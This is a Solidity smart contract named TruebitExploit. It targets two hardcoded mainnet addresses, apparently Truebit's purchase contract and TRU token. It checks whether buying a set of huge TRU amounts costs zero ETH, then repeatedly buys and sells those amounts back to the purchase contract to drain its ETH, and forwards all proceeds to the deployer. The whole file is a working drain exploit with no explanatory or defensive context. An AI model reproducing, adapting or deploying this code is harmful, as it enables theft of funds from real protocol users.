// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPurchase {
    function getPurchasePrice(uint256 amount) external view returns (uint256);
    function buyTRU(uint256 amount) external payable returns (uint256);
    function sellTRU(uint256 amount) external returns (uint256);
}

interface ITRU {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

contract TruebitExploit {
    IPurchase public constant PURCHASE = IPurchase(0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2);
    ITRU public constant TRU = ITRU(0xf65B5C5104c4faFD4b709d9D60a185eAE063276c);

    uint256[5] public EXPLOIT_AMOUNTS = [
        240442509453545333947284131,
        441010174513890026925958238,
        970752178501023300932298000,
        2808567055501947160504720479,
        12548923878784675664886517494 
    ];

    address public owner;

    event ExploitCycle(
        uint256 indexed cycle,
        uint256 amountMinted,
        uint256 pricePaid,
        uint256 ethReceived
    );

    event ExploitComplete(uint256 totalProfit);

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    function attack() external payable {
        require(msg.value >= 0.01 ether, "Need some ETH for gas");
        uint256 initialBalance = address(this).balance;
        for (uint256 i = 0; i < 5; i++) {
            _exploitCycle(i);
        }

        uint256 finalBalance = address(this).balance;
        uint256 profit = finalBalance - initialBalance + msg.value;
        emit ExploitComplete(profit);
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    function attackSingleCycle(uint256 cycleIndex) external payable {
        require(cycleIndex < 5, "Invalid cycle index");
        _exploitCycle(cycleIndex);
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    function _exploitCycle(uint256 cycleIndex) internal {
        uint256 amount = EXPLOIT_AMOUNTS[cycleIndex];
        uint256 price = PURCHASE.getPurchasePrice(amount);
        uint256 balanceBefore = address(this).balance;

        PURCHASE.buyTRU{value: price}(amount);
        uint256 truBalance = TRU.balanceOf(address(this));
        require(truBalance >= amount, "Mint failed");

        TRU.approve(address(PURCHASE), truBalance);
        uint256 ethBefore = address(this).balance;

        PURCHASE.sellTRU(truBalance);
        uint256 ethReceived = address(this).balance - ethBefore;
        
        emit ExploitCycle(cycleIndex, amount, price, ethReceived);
    }

    function checkVulnerability() external view returns (bool isVulnerable, uint256 price) {
        price = PURCHASE.getPurchasePrice(EXPLOIT_AMOUNTS[0]);
        isVulnerable = (price == 0);
    }

    function getContractState() external view returns (
        uint256 truTotalSupply,
        uint256 purchaseEthBalance
    ) {
        truTotalSupply = TRU.totalSupply();
        purchaseEthBalance = address(PURCHASE).balance;
    }
}
